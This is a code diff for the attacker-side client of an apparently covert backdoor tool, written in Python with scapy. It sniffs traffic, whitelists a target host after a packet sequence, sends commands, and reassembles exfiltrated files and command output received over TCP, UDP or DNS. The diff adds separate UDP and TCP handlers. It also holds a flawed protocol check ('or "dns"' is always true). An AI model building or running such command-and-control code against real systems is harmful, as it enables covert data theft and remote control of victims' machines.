@@ -29,16 +29,17 @@ class Client:
         self.filter = ""
         self.whitelist = []
         self.file_bits = []
+        self.cmd_bits = []
         self.recv_port = ""
         self.send_port = ""
         self.file_port = ""
 
-    def start(self):
+    def start(self) -> None:
         self.process_yaml()
         self.create_thread()
         self.get_input()
 
-    def get_input(self):
+    def get_input(self) -> None:
         while True:
             if self.check:
                 cmd = input("Enter command:")
@@ -46,17 +47,17 @@ class Client:
                 msg = self.prepare_msg(cmd)
                 self.craft_packet(msg)
 
-    def set_check(self):
+    def set_check(self) -> None:
         self.check = not self.check
 
-    def process_yaml(self):
+    def process_yaml(self) -> None:
         with open('config.yaml', 'r') as f:
             config = yaml.safe_load(f)
 
         self.target_ip = config['attacker']['target']
         self.recv_port = config['attacker']['recv_port']
         self.send_port = config['attacker']['send_port']
-        self.file_port = config['share']['src_port']
+        self.file_port = config['share']['file_port']
         self.proto = config['share']['proto']
         self.sequence = config['share']['sequence']
         self.filter = self.proto + " or tcp"
@@ -78,21 +79,81 @@ class Client:
         print("--------------------------------------------------------------")
         return hex_str
 
-    def create_thread(self):
+    def create_thread(self) -> None:
         x = Thread(target=self.sniff_init)
         x.start()
 
-    def sniff_init(self):
+    def sniff_init(self) -> None:
         try:
             sniff(filter=self.filter, prn=lambda p: self.filter_packets(p), store=False)
         except PermissionError:
             print("Permission error! Run as sudo or admin!")
             sys.exit()
 
-    def process_packets(self, msg: str):
+    def process_packets(self, msg: str) -> None:
         stripped_msg = msg.strip(self.flag_begin).rstrip(self.flag_close)
         print(f"{stripped_msg}")
         self.set_check()
+
+    def process_udp(self, packet: Packet) -> None:
+        """Handles UDP packets from target machine"""
+        try:
+            # Handles files
+            if IP in packet and packet[IP].src in self.whitelist \
+                    and packet[UDP].dport == self.recv_port and packet[UDP].sport == self.file_port:
+                msg = packet[UDP].load
+
+                if b'\x00' in msg:
+                    filename = msg.split(b'\x00')[0]
+                    filename = filename.decode()
+                    print("UDP/DNS Terminator received....")
+                    self.combine_bits(filename)
+                    self.file_bits = []
+                else:
+                    self.file_bits.append(msg)
+
+            # Handles response of executed commands
+            if UDP in packet and packet[UDP].dport == self.recv_port:
+                data = packet[Raw].load
+                if b'\x00' in data:
+                    print("Terminator received....")
+                    self.combine_bits("")
+                    self.cmd_bits = []
+                else:
+                    self.cmd_bits.append(data)
+        except:
+            return
+
+    def process_tcp(self, packet: Packet) -> None:
+        """Handles TCP packets from target machine"""
+          # Handles files
+        if IP in packet and packet[IP].src in self.whitelist \
+                and packet[TCP].dport == self.recv_port and packet[TCP].sport == self.file_port:
+            print(f"received data from whitelisted ip: {packet[IP].src}")
+            if Raw in packet:
+                data = packet[Raw].load
+                if b'\x00' in data:
+                    filename = data.split(b'\x00')[0]
+                    filename = filename.decode()
+                    print("Terminator received....")
+                    self.combine_bits(filename)
+                    self.file_bits = []
+                else:
+                    self.file_bits.append(data)
+            return
+
+        # Handles response of executed commands
+        try:
+            if TCP in packet and Raw in packet and packet[TCP].dport == self.recv_port:
+                data = packet[Raw].load
+                if b'\x00' in data:
+                    print("Terminator received....")
+                    self.combine_bits("")
+                    self.cmd_bits = []
+                else:
+                    self.cmd_bits.append(data)
+        except:
+            return
 
     def filter_packets(self, packet) -> None:
         """Various filters for packet processing, passes to
@@ -106,39 +167,37 @@ class Client:
                     print("Whitelisting a dude")
                     self.whitelist.append(packet[IP].src)
                     self.cur_pos = 0
+                return
 
-        # This filter process files received by covert client
-        if IP in packet and packet[IP].src in self.whitelist \
-                and packet[TCP].dport == self.recv_port and packet[TCP].sport == self.file_port:
-            if packet[IP].src in self.whitelist:
-                print(f"received data from whitelisted ip: {packet[IP].src}")
-                if Raw in packet:
-                    data = packet[Raw].load
-                    if b'\x00' in data:
-                        filename = data.split(b'\x00')[0]
-                        filename = filename.decode()
-                        print("Terminator received....")
-                        self.combine_bits(filename)
-                        self.file_bits = []
-                    else:
-                        self.file_bits.append(data)
-
-        # This is the filter for responses from executed commands
-        # try:
-        #     msg = packet[UDP].load.decode()
-        #     if UDP in packet and packet[UDP].dport == self.recv_port:
-        #         val = self.authenticate_packet(msg, packet)
-        #         if val:
-        #             self.process_packets(val)
-        # except:
-        #     return
+        # Check if it's a file or response to command
+        if self.proto == "tcp":
+            self.process_tcp(packet)
+        elif self.proto == "udp" or "dns":
+            self.process_udp(packet)
+        else:
+            return
 
     def combine_bits(self, name: str):
-        """Combines the stored data saves it as a file"""
-        data = b''.join(self.file_bits)
+        """Combines byte stream"""
+        if name:
+            self.save_file(name)
+        else:
+            self.get_command_response()
+
+    def get_command_response(self):
+        val = self.authenticate_packet(self.cmd_bits)
+        if val:
+            self.process_packets(val)
+
+    def save_file(self, name: str) -> None:
+        data = self.join_bytes(self.file_bits)
         with open(name, 'wb') as f:
             f.write(data)
         print("file saved")
+
+    def join_bytes(self, data: bytes) -> bytes:
+        """Converts byte array into byte sequence"""
+        return b''.join(data)
 
     def authenticate_packet(self, data: str) -> str:
         decrypted_msg = self.decrypt_data(data)
